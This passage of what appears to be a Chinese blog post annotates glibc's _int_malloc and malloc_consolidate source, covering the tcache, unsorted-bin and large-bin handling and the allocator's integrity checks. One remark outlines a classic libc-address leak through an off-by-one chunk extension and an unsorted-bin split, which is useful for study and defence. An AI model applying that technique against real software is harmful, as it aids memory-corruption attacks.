class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h6 id="large-bin阶段与malloc-consolidate"><a href="#large-bin阶段与malloc-consolidate" class="headerlink" title="large bin阶段与malloc_consolidate"></a>large bin阶段与malloc_consolidate</h6><p>当上面两个分支都不满足时，就进入了这个分支。如果有fastchunk的话，首先会进行一个<code>malloc_consolidate</code>操作，这个类似一个整理的过程，把碎片化的内存给合并起来，然后放入<code>unsorted bin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    	malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>malloc_consolidate</code>这个函数我们在分析free的时候也会用到，这里我们对它进行一个详细的分析。后面分析free的时候就一笔带过了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);<span class="comment">//由于consolidate之后没有了fastchunks，所以设置av-&gt;have_fastchunks为false</span></span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);<span class="comment">//获取unsorted bin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>); <span class="comment">//fastbin数组的尾部</span></span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);<span class="comment">//fastbin数组的头部</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))<span class="comment">//检查对齐</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">			     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">	  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<span class="comment">//检查该fastbin的chunk的size是否符合该bin的idx</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_inuse_chunk(av, p);</span><br><span class="line">	nextp = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	size = chunksize (p);</span><br><span class="line">	nextchunk = chunk_at_offset(p, size); <span class="comment">//获取物理相邻的下一个chunk</span></span><br><span class="line">	nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果物理相邻的上一个chunk不被使用，则进行一个合并</span></span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize; <span class="comment">//合并，size增大</span></span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//进行一个chunk的扩展，吞并上一个chunk</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">	  unlink_chunk (av, p); <span class="comment">//把上一个chunk从它属于的bin链表中unlink下来</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//如果后一个chunk不是top chunk</span></span><br><span class="line">	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize); </span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果物理相邻的后一个chunk不被使用，则把后一个chunk也unlink下来</span></span><br><span class="line">	    size += nextsize;</span><br><span class="line">	    unlink_chunk (av, nextchunk);</span><br><span class="line">	  &#125; <span class="keyword">else</span><span class="comment">//否则的话就把后一个chunk的prev_inuse位置0，表示后一个chunk的前一个chunk(也就是当前chunk)不被使用</span></span><br><span class="line">	    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  first_unsorted = unsorted_bin-&gt;fd; <span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">	  unsorted_bin-&gt;fd = p;</span><br><span class="line">	  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123; <span class="comment">//如果是large bin范围的size的话，还需要设置fd_nextsize等指针</span></span><br><span class="line">	    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  p-&gt;bk = unsorted_bin;<span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">	  p-&gt;fd = first_unsorted;</span><br><span class="line">	  set_foot(p, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="comment">//如果是top chunk，则top chunk把前一个chunk 吞并</span></span><br><span class="line">	  size += nextsize;</span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  av-&gt;top = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);<span class="comment">//循环每链表中每一个元素</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//循环fastbinY数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致过程就如注释所写得，过程比较简单，就是一个对物理相邻的前后的chunk检查然后合并的过程</p>
<h6 id="unsorted-bin阶段"><a href="#unsorted-bin阶段" class="headerlink" title="unsorted bin阶段"></a>unsorted bin阶段</h6><p>其实注意到刚刚的分支并没有对我们想要的chunk进行一个检索，而只是获得了对应large bin的idx，然后把fastbin中的chunk给整理合并。后面才涉及到一个对unsorted bin以及large bin的一个检索的过程</p>
<p>首先是这个,获取nb对应的tcache bin的idx，如果tcache存在并且idx合理的话，把<code>tcache_nb</code>赋为<code>nb</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>然后就进入到了一个大循环<code>for(;;)</code>，<strong>其大致结构简要如下所示</strong> 。(后面应该会在int_malloc的开头或者总结中补一个类似这样的流程，以直观看代码结构)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> iters = <span class="number">0</span>; <span class="comment">//循环最大次数</span></span><br><span class="line">    <span class="keyword">while</span>((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//unsorted bin中进行搜索(其实不止在unsorted bin，后面会详细解释这个循环)</span></span><br><span class="line">	&#123;</span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached) </span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!in_smallbin_range (nb)) <span class="comment">//large bin中进行搜索</span></span><br><span class="line">	&#123;</span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        ...<span class="comment">//binmap表等一系列操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    use_top:</span><br><span class="line">    ...<span class="comment">// 都没有找到合适的，到top chunk中进行切割</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先来看看<code>while((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</code>这个循环</p>
<p>首先是对victim物理相邻的属性以及在unsorted bin链表中的有效性进行了检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是unsorted bin中最后一个chunk，而bck是它的前一个</span></span><br><span class="line">size = chunksize (victim);</span><br><span class="line">mchunkptr next = chunk_at_offset (victim, size); <span class="comment">//next是victim物理相邻的下一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>); <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <span class="comment">//对next的prev_size进行检查是否等于victim的size</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) <span class="comment">//对unsorted bin中的链表有效性进行检查，判断bck的fd是否是victim</span></span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) <span class="comment">//对unsorted bin中的链表有效性进行检查,判断victim的fd是不是unsorted bin头</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="comment">//对next的prev_inuse进行检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而后进入这个判断，这是一个切割的过程。</p>
<p>如果我们请求的大小属于small bin范围，并且unsorted bin中只有victim一个chunk，并且victim是av-&gt;last_remainder，<strong>而且victim在被切成满足给用户请求大小的目标块后，剩余部分大于最小chunk的大小</strong>，就会进行一个切割操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">    only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">    runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">    exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">    no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb; <span class="comment">//获取切割后剩余块的大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb); <span class="comment">//获取剩余块</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    av-&gt;last_remainder = remainder;<span class="comment">// 设置 av-&gt;last_remainder = remainder为剩余块</span></span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) <span class="comment">//如果剩余块大小属于large bin，则还需要设置字段</span></span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//设置一些属性</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="comment">//返回给用户</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>顺便提一嘴，这个切割的操作是泄露libc的经典方法。比如我们利用off-by-one进行一个chunk extend，然后free掉放unsorted bin中，然后大切小，通过剩余的chunk泄露libc</p>
<p>然后是这个,把victim从unsorted bin中取出(我寻思着这个判断是不是多余了?前面不是判断过了吗)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>如果victim的大小刚刚好是我们想要的，则根据是否开启Tcache bin会有两种情况，一个是放入tcache中，设置return_cached为1，然后continue，在下一个循环中调用tcache_get取出，一个是直接返还给用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">  We may return one of these chunks later.  */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>而后则是根据取出的这个victim的大小，将其放入对应的bin中</p>
<p>如果这个victim的size属于small bin范围,则会选定<code>bck</code>与<code>fwd</code>如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>否则属于large bin范围，则进入如下分支。这里需要注意large bin的组织形式，不同大小的large chunk之间用<code>fd_nextsize</code>与<code>bk_nextsize</code>组织，而相同大小的large chunk用<code>fd</code>与<code>bk</code>相连。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">//判断该large bin是否为空</span></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//不为空则进一步操作</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">        <span class="comment">//bck-&gt;bk指向的是该bin中最小的chunk</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//如果这个chunk的大小比所有的chunk都要小</span></span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">//将其链入最后</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//否则则挑一个合适的地方进行链入</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size <span class="comment">//如果刚刚好有个相同大小的chunk链，则会放进相同chunk链的链表</span></span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//否则将chunk链入新的位置</span></span><br><span class="line">              &#123;</span><br><span 